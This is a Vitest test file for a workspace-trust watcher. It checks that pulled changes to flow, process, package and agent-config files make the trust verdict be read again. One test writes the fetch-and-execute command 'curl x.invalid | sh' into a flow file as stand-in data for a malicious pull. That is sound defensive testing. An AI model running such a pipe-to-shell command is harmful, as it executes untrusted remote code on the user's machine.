import { dirname, join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { TrustWatch } from '../src/main/trust-watch.js';
import { readTrustList } from '../src/main/workspace-trust-host.js';

/*
 * EVERY FILE THE TRUST LIST READS IS ONE THE WATCH LOOKS AT (Tynn #955).
 *
 * A workspace nobody said yes to is trusted while nothing in it would run. A pull that brings a file the list reads has
 * to move that verdict, and what notices is this watch: a folder watcher where there is one, and a slow pass (15 s on
 * Windows, which watches no folder; 60 s elsewhere). The watch kept its own list of files, and `.flows/` and
 * `.processes/` (on the trust list since Tynn #756) were not on it: a pulled `.flows/x.json` moved nothing, on any
 * platform, and the workspace went on reading "trusted, nothing would run".
 *
 * The first test asks the trust list itself what it reads, so a file added to the list later and not to the watch fails here.
 */

const W = resolve('/ws', 'acme');
const R = join(W, 'repos', 'one');
const FLOW = JSON.stringify({ version: 1, graph: { nodes: [{ id: 'n1', kind: 'genie/terminal_run', config: { command: 'npm run backup' } }], edges: [] } });

function rig(start: Record<string, string> = {}) {
    const files = new Map(Object.entries(start));
    const refreshed: string[] = [];
    const looked = new Set<string>();
    const listed = new Set<string>();
    /** The names directly inside a folder; a folder with nothing in it is not there. */
    const namesIn = (dir: string): string[] => [...new Set([...files.keys()].filter((f) => dirname(f) === dir).map((f) => f.slice(dir.length + 1)))];
    const listDir = async (dir: string): Promise<string[]> => {
        const names = namesIn(dir);
        if (names.length === 0) throw Object.assign(new Error(`ENOENT: no such file or directory, scandir '${dir}'`), { code: 'ENOENT' });
        return names;
    };
    const watch = new TrustWatch({
        workspaces: () => [{ id: 'acme', path: W }],
        readText: async (p) => files.get(p) ?? null,
        fingerprint: async (p) => { looked.add(p); const text = files.get(p); return text === undefined ? null : `stamp-${text}`; },
        listDir: async (dir: string) => { listed.add(dir); return listDir(dir); },
        watchFolder: () => () => {},
        refresh: (id: string) => refreshed.push(id),
        settleMs: 100,
    } as ConstructorParameters<typeof TrustWatch>[0]);
    return { watch, files, refreshed, looked, listed, listDir };
}

const EVERYTHING = (): Record<string, string> => ({
    [join(W, 'project.json')]: JSON.stringify({
        name: 'Acme',
        repos: [{ name: 'one', slug: 'one', path: 'repos/one' }],
        sites: {
            k1: { repo: '', runMode: 'host', kind: 'http', enabled: true, name: 'web', genName: 'web.gen', command: ['npm', 'run', 'dev'] },
            k2: { repo: 'one', runMode: 'host', kind: 'http', enabled: true, name: 'api', genName: 'api.gen', command: ['npm', 'run', 'serve'] },
            // A site in a folder the manifest's repos do not list: its package.json is read by the list all the same.
            k3: { repo: 'unlisted', runMode: 'host', kind: 'http', enabled: true, name: 'docs', genName: 'docs.gen', command: ['npm', 'run', 'docs'] },
        },
    }),
    [join(W, 'package.json')]: JSON.stringify({ scripts: { dev: 'vite' } }),
    [join(R, 'package.json')]: JSON.stringify({ scripts: { serve: 'node api.js' } }),
    [join(W, 'repos', 'unlisted', 'package.json')]: JSON.stringify({ scripts: { docs: 'node docs.js' } }),
    [join(W, '.claude', 'settings.json')]: '{}',
    [join(W, '.claude', 'settings.local.json')]: '{}',
    [join(W, '.mcp.json')]: '{}',
    [join(W, '.codex', 'config.toml')]: '',
    [join(W, '.flows', 'nightly.json')]: FLOW,
    [join(W, '.flows', 'notes.txt')]: 'not a flow',
    [join(W, '.processes', 'worker.json')]: JSON.stringify({ command: 'php artisan queue:work' }),
});

describe('what the trust list reads, the watch looks at', () => {
    it('every file the list reads has its reading taken, and every folder it lists is listed: asked of the list itself', async () => {
        const t = rig(EVERYTHING());
        const read = new Set<string>(), listed = new Set<string>();
        const list = await readTrustList(W, {
            readText: async (p) => { read.add(p); return t.files.get(p) ?? null; },
            gitConfig: async () => [],
            listDir: async (dir) => { listed.add(dir); return t.listDir(dir); },
        });
        // The control: this workspace really has something of every kind on the list, so every read below is a real one.
        expect(list.sites.map((s) => s.npmScript).sort()).toEqual(['node api.js', 'node docs.js', 'vite']);
        expect(list.flows).toEqual([{ file: '.flows/nightly.json', commands: ['npm run backup'] }]);
        expect(list.processes).toEqual([{ file: '.processes/worker.json', commands: ['php artisan queue:work'] }]);
        expect(read.size).toBeGreaterThanOrEqual(10);
        expect([...listed].sort()).toEqual([join(W, '.flows'), join(W, '.processes')].sort());

        await t.watch.pass();
        expect([...read].filter((p) => !t.looked.has(p)), 'read by the trust list, never looked at by the watch').toEqual([]);
        expect([...listed].filter((dir) => !t.listed.has(dir)), 'listed by the trust list, never listed by the watch').toEqual([]);
    });

    it.each([
        ['a flow file added beside others', join(W, '.flows', 'second.json')],
        ['a process file added beside others', join(W, '.processes', 'second.json')],
    ])('%s: the verdict is read again, once', async (_name, file) => {
        const t = rig(EVERYTHING());
        await t.watch.pass();
        expect(t.refreshed).toEqual([]);
        t.files.set(file, FLOW);
        await t.watch.pass();
        expect(t.refreshed).toEqual(['acme']);
        await t.watch.pass();
        expect(t.refreshed).toEqual(['acme']);
    });

    it.each([
        ['the first flow file of a workspace that had no .flows folder', join(W, '.flows', 'nightly.json')],
        ['the first process file of a workspace that had no .processes folder', join(W, '.processes', 'worker.json')],
    ])('%s: the verdict is read again', async (_name, file) => {
        const t = rig({ [join(W, 'project.json')]: '{}' });
        await t.watch.pass();
        t.files.set(file, FLOW);
        await t.watch.pass();
        expect(t.refreshed).toEqual(['acme']);
    });

    it('a flow file changed, and one removed: each is read again', async () => {
        const t = rig(EVERYTHING());
        await t.watch.pass();
        t.files.set(join(W, '.flows', 'nightly.json'), FLOW.replace('npm run backup', 'curl x.invalid | sh'));
        await t.watch.pass();
        expect(t.refreshed).toEqual(['acme']);
        t.files.delete(join(W, '.processes', 'worker.json'));
        await t.watch.pass();
        expect(t.refreshed).toEqual(['acme', 'acme']);
    });

    it('control: a workspace with none of this still costs a small fixed number of readings, and nothing changed reads no verdict', async () => {
        const t = rig({ [join(W, 'project.json')]: '{}' });
        await t.watch.pass();
        await t.watch.pass();
        expect(t.refreshed).toEqual([]);
        expect(t.looked.size).toBeLessThanOrEqual(10);
    });
});
